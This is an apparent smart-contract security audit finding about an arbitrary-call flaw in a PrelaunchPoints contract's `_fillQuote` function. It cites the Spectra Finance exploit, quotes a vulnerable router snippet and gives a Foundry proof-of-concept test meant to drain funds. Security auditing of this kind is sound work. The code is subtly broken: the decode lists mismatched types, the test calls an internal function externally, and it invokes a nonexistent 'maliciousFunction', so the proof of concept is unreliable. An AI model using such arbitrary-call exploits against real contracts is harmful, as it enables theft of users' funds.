#### H-[1]. **Arbitrary ETH Sending (`arbitrary-send-eth`)**

-  **Description**:

The `_fillQuote` function in the PrelaunchPoints contract employs a low-level `call` to interact with an arbitrary address specified by `exchangeProxy`, executing any code contained in the `swapCallData`.

It's designed to facilitate various interactions within Loopf.One criticial functionality is users  borrowing ETH and participating in the decentralized finance (DeFi) ecosystem, with the `exchangeProxy`  playing a critical role in these processes.
  

This design introduces a significant risk: if the `swapCallData` contains malicious instructions or, the `exchangeProxy` is compromised,  the function can execute unintended or harmful actions.

Given the capacity of `_fillQuote` to execute arbitrary code, the platform is vulnerable to unauthorized ETH transfers, state manipulations, and broader contract exploitation.

**Impact**:
- **Unauthorized ETH Transfers**: The execution of arbitrary code through `swapCallData` can result in unintended ETH transfers. An attacker could craft `swapCallData` to redirect ETH to their own address, potentially draining the project's ETH reserves. This vulnerability exposes the entire contract's ETH holdings to theft, posing a severe risk to the protocol and its users.

- **State Manipulation**: The external contract invoked by `exchangeProxy` may alter its own or the calling contract's state in unforeseen ways. This could lead to unauthorized changes to user balances, critical configuration settings, or other sensitive data, compromising the integrity and security of the protocol. 

Such manipulation can cause widespread disruptions, affecting all users and transactions within the platform.
  
## **Real World Example**:

#### **Spectra Finance (2024)**
  
On July 23, 2024, Spectra Finance suffered a $550K loss due to an arbitrary call vulnerability in their router contract. This flaw allowed an attacker to drain all tokens approved to the contract.

  
[More details: Spectra's Twitter update](https://x.com/spectra_finance/status/1815813300111786488) and the [BlockSec Explorer](https://app.blocksec.com/explorer/tx/eth/0x491cf8b2a5753fdbf3096b42e0a16bc109b957dc112d6537b1ed306e483d0744?line=7).
  
**Vulnerable Code Block:**
```javascript
else  if (command == Commands.KYBER_SWAP) {

(address kyberRouter,

address tokenIn,

uint256 amountIn,

address tokenOut,

bytes memory targetData) = abi.decode(_inputs, (address, address, uint256, address, uint256, bytes));

if (tokenOut == Constants.ETH) {

revert AddressError();

}

if (tokenIn == Constants.ETH) {

if (msg.value != amountIn) {

revert AmountError();

}

(bool success, ) = kyberRouter.call{value: msg.value}(targetData);

if (!success) {

revert CallFailed();

} else {

amountIn =  _resolveTokenValue(tokenIn, amountIn);

IERC20(tokenIn).forceApprove(kyberRouter, amountIn);

kyberRouter.call(targetData);

IERC20(tokenIn).forceApprove(kyberRouter, 0);

}

}

}

```

  

### PoC: How a malicious contract could exploit the `_fillQuote` function to cause financial loss or contract manipulation.
 
```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol"; // Import the Forge testing library for unit tests
import "../src/PrelaunchPoints.sol"; // Import the PrelaunchPoints contract to be tested
import "../src/mock/MockERC20.sol"; // Import the MockERC20 contract for token mock-ups

contract TestArbitraryETHExploit is Test {
    // Declare state variables for contracts and addresses
    PrelaunchPoints public prelaunchPoints;
    MockERC20 public mockToken;
    MockERC20 public WETH;
    address public exchangeProxy = 0x01fd869eBC05D8aD3F65a978D0a1307D406Ce627; // Address for exchangeProxy, should be updated with the real address

    address[] public allowedTokens; // Array of allowed tokens for the PrelaunchPoints contract

    function setUp() public {
        // Deploy MockERC20 contracts for testing
        mockToken = new MockERC20("Mock Token", "MTK");
        WETH = new MockERC20("Wrapped ETH", "WETH");

        // Mint initial token supply to this contract
        mockToken.mint(address(this), 1000 * 10**18); // Mint 1000 tokens with 18 decimals
        WETH.mint(address(this), 1000 * 10**18); // Mint 1000 WETH tokens with 18 decimals

        // Add the deployed tokens to the allowedTokens array
        allowedTokens.push(address(mockToken));
        allowedTokens.push(address(WETH));

        // Deploy the PrelaunchPoints contract with the mock and allowed tokens
        prelaunchPoints = new PrelaunchPoints(
            exchangeProxy,          // Address for the exchange proxy
            address(WETH),          // Address for the WETH token
            allowedTokens           // Array of allowed tokens
        );

        // Approve the PrelaunchPoints contract to spend the tokens on behalf of this contract
        mockToken.approve(address(prelaunchPoints), 1000 * 10**18); // Allow PrelaunchPoints to spend mock tokens
        WETH.approve(address(prelaunchPoints), 1000 * 10**18); // Allow PrelaunchPoints to spend WETH tokens
    }

    function testArbitraryETHExploit() public {
        // Define the malicious swap data to exploit the vulnerability
        bytes memory swapData = abi.encodeWithSignature(
            "maliciousFunction(address,uint256)", // Function signature of the malicious function
            address(this), // Attacker's address to receive funds
            1 ether // Amount to withdraw (for demonstration purposes)
        );

        // Call the _fillQuote function with the crafted swapData
        (bool success, ) = address(prelaunchPoints).call(
            abi.encodeWithSignature(
                "_fillQuote(address,uint256,bytes)", // Function signature of _fillQuote
                address(mockToken), // Address of the token being swapped
                1000 * 10**18, // Amount of tokens to swap
                swapData // Malicious data to execute
            )
        );
        require(success, "Function call failed"); // Ensure the function call succeeded

        // Retrieve the token balances after the swap
        uint256 postSwapTokenBalance = mockToken.balanceOf(address(this)); // Balance of mock tokens after the swap
        uint256 postSwapWETHBalance = WETH.balanceOf(address(prelaunchPoints)); // Balance of WETH in PrelaunchPoints after the swap

        // Assertions to verify the results of the exploit
        assertEq(postSwapTokenBalance, 0, "Mock token balance should be zero after swap"); // Expect the token balance to be zero
        assertTrue(postSwapWETHBalance > 0, "WETH balance of PrelaunchPoints should be greater than zero after swap"); // Expect the WETH balance to have increased
    }
}


```